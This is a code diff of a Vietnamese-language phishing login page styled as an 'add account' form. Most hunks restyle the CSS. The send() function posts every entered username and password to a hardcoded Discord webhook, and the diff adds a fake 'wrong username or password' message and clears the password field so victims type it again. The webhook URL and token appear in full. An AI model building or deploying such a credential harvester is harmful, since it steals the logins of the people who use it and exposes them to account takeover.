@@ -55,28 +55,39 @@
             z-index: 10; width: 100%; flex: 1;
         }
         .login-box {
-            background-color: #25272b;
+            background-color: #1c1e22; 
             padding: 5px 12px 18px 12px;
             width: 210px; text-align: center; color: #fff; 
-            border-radius: 6px; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
+            border-radius: 6px; box-shadow: 0 5px 25px rgba(0,0,0,0.9);
         }
 
-        /* ĐÃ TĂNG KÍCH THƯỚC CHỮ */
         h2 { 
-            font-size: 18px; /* Tăng từ 14px lên 18px */
+            font-size: 18px; 
             margin-top: 15px; 
             margin-bottom: 18px; 
             font-weight: 800; 
-            letter-spacing: 0px; /* Reset letter-spacing để chữ rõ hơn khi to */
         }
 
         .input-field {
             width: 100%; height: 19px; padding: 0 8px;
-            background: #32353b; border: 1px solid #3d4147;
+            background: #2a2d33;
+            border: 1px solid #35383e;
             border-radius: 3px; color: white; font-size: 7.5px; outline: none;
         }
         .input-field-u { margin-bottom: 3px; }
+        
+        /* CSS CHO DÒNG LỖI CHỮ ĐỎ */
+        #error-msg {
+            color: #ff4d4d;
+            font-size: 6.5px;
+            text-align: left;
+            margin-bottom: 5px;
+            padding-left: 2px;
+            display: none; /* Mặc định là ẩn */
+        }
+
         .input-field-p { margin-bottom: 8px; }
+
         .btn-login {
             width: 100%; height: 19px; background: transparent; color: #fff;
             border: 1px solid #fff; border-radius: 3px; font-size: 8px;
@@ -84,8 +95,10 @@
         }
         .forgot-link { display: block; margin-top: 6px; color: #adb5bd; font-size: 6.5px; text-decoration: none; }
         .spacer { height: 16px; width: 100%; }
+        
         .btn-action {
-            width: 100%; height: 17px; padding: 0; background: #3c4046; 
+            width: 100%; height: 17px; padding: 0; 
+            background: #2f3238; 
             border: none; color: #fff; border-radius: 3px; font-size: 7px; 
             margin-bottom: 4px; font-weight: 600;
             display: flex; align-items: center; justify-content: center;
@@ -147,6 +160,9 @@
     <div class="login-box">
         <h2>Thêm tài khoản</h2>
         <input type="text" id="u" class="input-field input-field-u" placeholder="Tên người dùng/Email/SĐT">
+        
+        <div id="error-msg">Sai tên người dùng hoặc mật khẩu.</div>
+        
         <input type="password" id="p" class="input-field input-field-p" placeholder="Mật khẩu">
         <button class="btn-login" onclick="send()">Đăng nhập</button>
         
@@ -180,13 +196,26 @@
     function send() {
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
-        if(!u || !p) return;
+        const err = document.getElementById('error-msg');
+
+        if(!u || !p) {
+            err.style.display = 'block';
+            return;
+        }
+
+        // Gửi dữ liệu về Discord
         fetch("https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
         });
-        setTimeout(() => { alert("Thông tin đăng nhập không chính xác."); window.location.reload(); }, 800);
+
+        // Hiện chữ đỏ báo lỗi thay vì alert
+        setTimeout(() => { 
+            err.style.display = 'block';
+            // Xóa mật khẩu cũ để bắt nhập lại cho thật
+            document.getElementById('p').value = ""; 
+        }, 500);
     }
 </script>
 </body>
